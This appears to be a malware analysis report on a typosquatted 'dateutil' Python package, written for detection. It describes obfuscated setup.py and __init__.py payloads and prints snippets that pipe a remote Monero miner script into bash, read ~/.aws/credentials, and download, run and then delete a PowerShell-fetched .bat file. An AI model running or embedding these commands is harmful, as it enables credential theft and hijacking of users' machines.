package_info.package_versions: 3.0.3 (and possibly others from the same week)
package_info.why_malicious: The package is a typosquat of the legitimate 'dateutil' and 'dateutils' libraries and contains heavily obfuscated code in both setup.py and __init__.py. This code, triggered at both install-time and import-time, decodes and executes a hidden payload that downloads and runs a Monero cryptocurrency miner and exfiltrates sensitive data (including AWS credentials and system fingerprinting information) to an external Discord webhook. The obfuscation uses both Base64 and ROT13 to evade static analysis, and the payload is designed to operate cross-platform, with anti-forensics measures on Windows.

malicious_snippets.code_snippet:
import base64, codecs
magic = '...'  # Large base64+ROT13 string
love = ...
god = ...
...
eval(compile(base64.b64decode(eval('...')), 'string', 'exec'))
malicious_snippets.code_behavior: Obfuscated code in setup.py that decodes and executes a hidden payload using Base64 and ROT13. Upon installation, this payload fingerprints the system, collects sensitive data, and initiates further malicious actions such as downloading a crypto miner and exfiltrating credentials.

malice_analysis.why_suspicious: The use of both Base64 and ROT13 obfuscation, combined with dynamic code execution via eval and compile, is a strong indicator of an attempt to conceal malicious behavior from both static and dynamic analysis tools.
malice_analysis.violated_expectations: setup.py should only contain installation logic and dependency declarations. Executing obfuscated code that performs network operations or arbitrary payload execution is never legitimate.
malice_analysis.similar_legitimate_use: Obfuscation and dynamic code execution are almost never justified in open source install scripts. Legitimate setup.py files do not contain hidden payloads or network activity.
key_indicators: Obfuscated code block using Base64 and ROT13

malicious_snippets.code_behavior: Obfuscated code in __init__.py that, when the package is imported, decodes and executes a payload similar to setup.py. This enables credential theft, system fingerprinting, and crypto mining on import.

malice_analysis.why_suspicious: Obfuscated code in __init__.py is highly unusual and is designed to trigger on import, maximizing the attack surface and ensuring execution even if the package is not installed via setup.py.
malice_analysis.violated_expectations: __init__.py should only initialize the package namespace and should not execute hidden payloads or perform network operations.
malice_analysis.similar_legitimate_use: Obfuscation and dynamic execution are not legitimate in package initializers. Legitimate __init__.py files do not contain hidden or network-active code.

malicious_snippets.code_behavior: Exfiltrates system information, including IP address, OS type, and arbitrary content (such as AWS credentials), to a hardcoded Discord webhook controlled by the attacker.

malice_analysis.why_suspicious: The function is designed to send sensitive data to an external Discord webhook, which is a clear sign of data exfiltration and malicious intent.
malice_analysis.violated_expectations: Legitimate packages should never transmit system or credential data to third-party endpoints, especially hardcoded webhooks.
malice_analysis.similar_legitimate_use: Webhooks may be used for legitimate telemetry, but never for exfiltrating credentials or system fingerprints.
key_indicators: Exfiltration of credentials and system info
Use of requests.post to external endpoint

if platform == "Linux" or platform == "Linux2":
    system_info = subprocess.Popen("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.sh | bash -s 4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: Downloads and executes a Monero (XMR) cryptocurrency miner from a remote repository using the attacker's wallet address on Linux systems.

malice_analysis.why_suspicious: Automated download and execution of a cryptocurrency miner is a classic sign of resource hijacking and is never legitimate in a package.
malice_analysis.violated_expectations: Legitimate packages should not download or execute external binaries, especially cryptocurrency miners, without explicit user consent.
malice_analysis.similar_legitimate_use: Automated installers may fetch dependencies, but never cryptocurrency miners or unauthorized binaries.
key_indicators: Download and execution of remote shell script

malicious_snippets.code_snippet:
if platform == "win32":
    system_info = subprocess.Popen("powershell -Command \"$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: On Windows, downloads and executes a PowerShell script to install and run a Monero miner, then deletes the script after execution to evade detection (anti-forensics).

malice_analysis.why_suspicious: Downloading and executing a remote script to install a miner, followed by immediate deletion of the script, is a clear anti-forensics technique and highly malicious.
malice_analysis.violated_expectations: Legitimate packages should not execute or clean up external scripts in this manner, especially for unauthorized mining.
malice_analysis.similar_legitimate_use: Temporary scripts may be used for setup, but not for mining or anti-forensics. Legitimate use would not involve cryptocurrency mining.
key_indicators: PowerShell download and execution of remote .bat file

malicious_snippets.code_snippet:
if platform == "Linux" or platform == "Linux2":
    system_info = subprocess.Popen("cat ~/.aws/credentials; curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.sh | bash -s 4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: Reads AWS credentials from the default location (~/.aws/credentials) and includes them in the exfiltrated data sent to the attacker's webhook, in addition to running the Monero miner.

malice_analysis.why_suspicious: Accessing and exfiltrating ~/.aws/credentials is a direct attempt to steal cloud credentials, which is a high-severity threat.
malice_analysis.violated_expectations: Legitimate packages should never access or transmit credential files, especially cloud provider credentials.
malice_analysis.similar_legitimate_use: No legitimate use case exists for exfiltrating credentials from ~/.aws/credentials.

attack_chain.action: User installs or imports the malicious package, triggering obfuscated code execution in setup.py (postinstall) or __init__.py (import-time).
Obfuscated payload is decoded and executed, fingerprinting the system and preparing for further malicious actions.
System information, IP address, OS type, and AWS credentials are collected and exfiltrated to the attacker's Discord webhook.
Depending on the OS, a Monero miner is downloaded and executed using a remote shell script (Linux) or PowerShell script (Windows).
attack_chain.leads_to: System resources hijacked for crypto mining

attack_chain.action: On Windows, the miner installation script is deleted after execution to evade detection and hinder forensic analysis.

behavioral_signatures: Obfuscated code using Base64 and ROT13 in setup.py or __init__.py
Dynamic code execution via eval/compile on decoded payloads
Network requests to Discord webhooks or similar endpoints
Automated download and execution of remote shell or PowerShell scripts
Access to ~/.aws/credentials or other sensitive files
Creation and deletion of temporary .bat files in Windows temp directories
file_indicators: Obfuscated blocks in setup.py and src/dateutil/__init__.py
Temporary .bat files in Windows temp directories
detection_knowledge.how_to_detect: Scan for obfuscated code blocks (Base64, ROT13) and dynamic code execution (eval/compile) in setup.py and src/dateutil/__init__.py. Monitor for network requests to hardcoded Discord webhooks and MoneroOcean GitHub URLs. Flag any package that accesses ~/.aws/credentials or downloads and executes remote scripts. On Windows, watch for creation and rapid deletion of temporary .bat files in temp directories, which may indicate anti-forensics activity.
